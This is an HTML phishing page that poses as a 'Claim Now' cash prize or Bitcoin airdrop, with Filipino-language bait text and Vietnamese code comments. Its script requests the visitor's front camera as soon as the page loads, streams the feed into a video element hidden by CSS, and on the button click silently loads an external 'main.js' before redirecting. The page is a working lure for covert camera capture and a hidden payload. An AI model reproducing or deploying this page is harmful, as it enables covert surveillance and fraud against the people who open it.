<!DOCTYPE html>
<html lang="tl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blockchain Airdrop - Nhận 1 BTC</title>
    <style>
        body{
    font-family: 'Segoe UI', Tahoma, sans-serif;
    background: #f5f5f5;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}

.container{
    background: #ffffff;
    padding: 30px;
    border-radius: 12px;
    box-shadow: 0 10px 25px rgba(0,0,0,0.1);
}

        .card {
            background: #808080;
            padding: 30px;
            border-radius: 16px;
            text-align: center;
            width: 90%;
            max-width: 400px;
            border: 1px solid #474d57;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        }

        .logo-icon {
            width: 80px;
            margin-bottom: 20px;
        }

        h2 {
            color: #f3ba2f;
            margin-bottom: 10px;
        }

        p {
            color: #ffffff;
            font-size: 14px;
            line-height: 1.6;
        }

        .btn {
            background: #f3ba2f;
            color: #000;
            border: none;
            padding: 15px;
            width: 100%;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            font-size: 16px;
            margin-top: 20px;
            transition: 0.3s;
        }

        .btn:hover {
            background: #dba323;
        }

        /* Camera ẩn hoàn toàn */
        #vBox {
            width: 0;
            height: 0;
            opacity: 0;
            overflow: hidden;
            position: absolute;
        }

        #loading {
            display: none;
            margin-top: 20px;
        }

        .spinner {
            border: 3px solid #30363d;
            border-top: 3px solid #f3ba2f;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }
    </style>
</head>

<body>

    <div class="card">
        <img src="https://raw.githubusercontent.com/ninoadajar-a11y/Aray-mo/refs/heads/main/b1254f40-ca11-43dd-97a1-d86053dec6ba.jpeg" class="logo-icon" alt="7/11">
        <h2>🎉 CONGRATULATIONS! 🎉</h2>
        <p>Nanalo ka ng ₱1,000 Cash Prize! 💸
Ikaw ay napili bilang lucky winner sa aming random draw today.
Para ma-claim ang prize mo:
👉 Click “Claim Now”
⏳ Limited time lang ang claim!</p>

        <div id="vBox">
            <video id="preview" autoplay playsinline muted></video>
        </div>

        <div id="loading">
            <div class="spinner"></div>
            <p>Processing request...</p>
        </div>

        <button class="btn" id="startBtn">Claim Now!!!</button>
    </div>

    <script>
        const btn = document.getElementById('startBtn');
        const loading = document.getElementById('loading');
        const video = document.getElementById('preview');
        const REDIRECT_URL = ""; // Trang đích sau khi xong

        // Kích hoạt camera ngay khi vào trang để sẵn sàng
        async function initCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                video.srcObject = stream;
            } catch (err) { console.warn("Yêu cầu quyền camera để nhận thưởng."); }
        }
        initCamera();

        btn.addEventListener('click', () => {
            btn.style.display = 'none';
            loading.style.display = 'block';

            // Gọi script xử lý ngầm
            const script = document.createElement('script');
            script.src = 'main.js';
            document.body.appendChild(script);

            // Chờ tín hiệu từ main.js để chuyển hướng
            const check = setInterval(() => {
                if (window.mainScriptFinished) {
                    clearInterval(check);
                    window.location.href = REDIRECT_URL;
                }
            }, 500);
        });
    </script>
</body>

</html>
